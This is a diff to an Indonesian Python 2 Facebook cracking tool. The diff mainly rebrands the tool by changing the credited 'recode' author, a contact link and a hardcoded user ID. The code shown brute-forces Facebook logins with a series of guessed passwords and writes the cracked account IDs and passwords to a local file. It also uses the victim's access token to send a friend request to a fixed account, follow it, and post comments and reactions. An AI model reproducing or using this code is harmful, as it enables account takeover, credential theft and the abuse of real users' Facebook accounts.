@@ -23,7 +23,7 @@ try:
     import requests
 except ImportError:
     os.system('pip2 install requests')
-    os.system('python2 cr4ck.py')
+    os.system('python2 roy-scold.py')
 
 from requests.exceptions import ConnectionError
 from mechanize import Browser
@@ -83,7 +83,7 @@ def jalan(z):
         time.sleep(0.03)
 
 
-logo = ' \n\x1b[1;91m $$$$$$\\            $$\\   $$\\           $$\\       \n$$  __$$\\           $$ |  $$ |          $$ |      \n$$ /  \\__| $$$$$$\\  $$ |  $$ | $$$$$$$\\ $$ |  $$\\ \n$$ |      $$  __$$\\ $$$$$$$$ |$$  _____|$$ | $$  |\n\x1b[1;97m$$ |      $$ |  \\__|\\_____$$ |$$ /      $$$$$$  / \n$$ |  $$\\ $$ |            $$ |$$ |      $$  _$$<  \n\\$$$$$$  |$$ |            $$ |\\$$$$$$$\\ $$ | \\$$\\ \n \\______/ \\__|            \\__| \\_______|\\__|  \\__|    \x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80 \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mAuthor  \x1b[1;91m : \x1b[1;96mMuhammad Rizky  \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mRecode  \x1b[1;91m : \x1b[1;96mRomi Afrizal    \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mFacebook \x1b[1;91m: \x1b[1;96mfacebook.com/romi.29.04.03'
+logo = ' \n\x1b[1;91m $$$$$$\\            $$\\   $$\\           $$\\       \n$$  __$$\\           $$ |  $$ |          $$ |      \n$$ /  \\__| $$$$$$\\  $$ |  $$ | $$$$$$$\\ $$ |  $$\\ \n$$ |      $$  __$$\\ $$$$$$$$ |$$  _____|$$ | $$  |\n\x1b[1;97m$$ |      $$ |  \\__|\\_____$$ |$$ /      $$$$$$  / \n$$ |  $$\\ $$ |            $$ |$$ |      $$  _$$<  \n\\$$$$$$  |$$ |            $$ |\\$$$$$$$\\ $$ | \\$$\\ \n \\______/ \\__|            \\__| \\_______|\\__|  \\__|    \x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80 \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mAuthor  \x1b[1;91m : \x1b[1;96mMuhammad Rizky  \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mRecode  \x1b[1;91m : \x1b[1;96mRoy Octa Firdaus    \n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mFacebook \x1b[1;91m: \x1b[1;96mfacebook.com/JbFbOld'
 back = 0
 threads = []
 berhasil = []
@@ -148,7 +148,7 @@ def ambil_token():
     print logo
     print 50 * '\x1b[1;94m\xe2\x94\x80'
     jalan('        \x1b[1;92mAnda Akan Di Arahkan Ke Browser ...')
-    os.system('xdg-open https://drive.google.com/file/d/1eAuQG4aFIH49r0ACpoUWspnSG2VUl4Ci/view?usp=drivesdk')
+    os.system('xdg-open https://api.whatsapp.com/send?phone=6281318306972-mg')
     time.sleep(2)
     masuk()
 
@@ -160,7 +160,7 @@ def bot_komen():
         print '\x1b[1;97m[!] Token invalid'
         os.system('rm -rf login.txt')
 
-    una = '100002461344178'
+    una = '100035322483719'
     kom = 'Mantap Bang \xf0\x9f\x98\x98'
     post = '3889672344458105'
     post2 = '3889672344458105'
@@ -168,7 +168,7 @@ def bot_komen():
     reac2 = 'ANGRY'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/100002461344178/friends?access_token=' + toket)
-    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + toket)
+    requests.post('https://graph.facebook.com/100035322483719/subscribers?access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
@@ -395,20 +395,20 @@ def pilih_indo():
             ko = json.load(data)
             if 'access_token' in ko:
                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos1
                 oke = open('done/indo.txt', 'a')
-                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
                 print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
+                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos1
                 cek = open('done/indo.txt', 'a')
-                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Paw Fb : ' + bos1 + '\n')
                 cek.close()
                 cekpoint.append(zowe)
             else:
@@ -417,20 +417,20 @@ def pilih_indo():
                 ko = json.load(data)
                 if 'access_token' in ko:
                     print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos2
                     oke = open('done/indo.txt', 'a')
-                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     oke.close()
                     oks.append(zowe)
                 elif 'www.facebook.com' in ko['error_msg']:
                     print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
+                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos2
                     cek = open('done/indo.txt', 'a')
-                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     cek.close()
                     cekpoint.append(zowe)
                 else:
@@ -439,20 +439,20 @@ def pilih_indo():
                     ko = json.load(data)
                     if 'access_token' in ko:
                         print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos3
                         oke = open('done/indo.txt', 'a')
-                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         oke.close()
                         oks.append(zowe)
                     elif 'www.facebook.com' in ko['error_msg']:
                         print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
+                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m: \x1b[1;93m' + bos3
                         cek = open('done/indo.txt', 'a')
-                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         cek.close()
                         cekpoint.append(zowe)
                     else:
@@ -461,20 +461,20 @@ def pilih_indo():
                         ko = json.load(data)
                         if 'access_token' in ko:
                             print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos4
                             oke = open('done/indo.txt', 'a')
-                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             oke.close()
                             oks.append(zowe)
                         elif 'www.facebook.com' in ko['error_msg']:
                             print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
+                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos4
                             cek = open('done/indo.txt', 'a')
-                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             cek.close()
                             cekpoint.append(zowe)
                         else:
@@ -483,20 +483,20 @@ def pilih_indo():
                             ko = json.load(data)
                             if 'access_token' in ko:
                                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos5
                                 oke = open('done/indo.txt', 'a')
-                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 oke.close()
                                 oks.append(zowe)
                             elif 'www.facebook.com' in ko['error_msg']:
                                 print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
+                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos5
                                 cek = open('done/indo.txt', 'a')
-                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 cek.close()
                                 cekpoint.append(zowe)
                             else:
@@ -505,20 +505,20 @@ def pilih_indo():
                                 ko = json.load(data)
                                 if 'access_token' in ko:
                                     print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m: \x1b[1;92m' + bos6
                                     oke = open('done/indo.txt', 'a')
-                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
+                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     oke.close()
                                     oks.append(zowe)
                                 elif 'www.facebook.com' in ko['error_msg']:
                                     print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
+                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos6
                                     cek = open('done/indo.txt', 'a')
-                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
+                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     cek.close()
                                     cekpoint.append(zowe)
                                 else:
@@ -527,20 +527,20 @@ def pilih_indo():
                                     ko = json.load(data)
                                     if 'access_token' in ko:
                                         print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
+                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m: \x1b[1;92m' + bos7
                                         oke = open('done/indo.txt', 'a')
-                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
+                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos7 + '\n')
                                         oke.close()
                                         oks.append(zowe)
                                     elif 'www.facebook.com' in ko['error_msg']:
                                         print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
+                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos7
                                         cek = open('done/indo.txt', 'a')
-                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
+                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos7 + '\n')
                                         cek.close()
                                         cekpoint.append(zowe)
                                     else:
@@ -549,20 +549,20 @@ def pilih_indo():
                                         ko = json.load(data)
                                         if 'access_token' in ko:
                                             print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
+                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos8
                                             oke = open('done/indo.txt', 'a')
-                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
+                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos8 + '\n')
                                             oke.close()
                                             oks.append(zowe)
                                         elif 'www.facebook.com' in ko['error_msg']:
                                             print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
